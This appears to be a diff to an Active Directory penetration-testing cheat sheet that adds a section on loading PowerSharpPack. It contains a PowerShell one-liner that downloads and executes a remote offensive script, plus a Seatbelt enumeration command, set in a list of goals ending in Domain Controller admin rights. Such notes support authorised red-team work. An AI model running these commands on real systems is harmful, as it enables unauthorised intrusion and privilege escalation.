@@ -34,6 +34,12 @@ Goal:
 4. (Possibly) escalate privileges in the machine.
 5. Repeat steps above until you have administrative privileges in the Domain Controller.
 
+## PowerSharpPack
+Just load the main script with
+`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')`
+and choose the tool as switch parameter for example:
+`PowerSharpPack -seatbelt -Command "AMSIProviders"`
+
 ## AD Enumeration
 
 Users / Groups / Computers
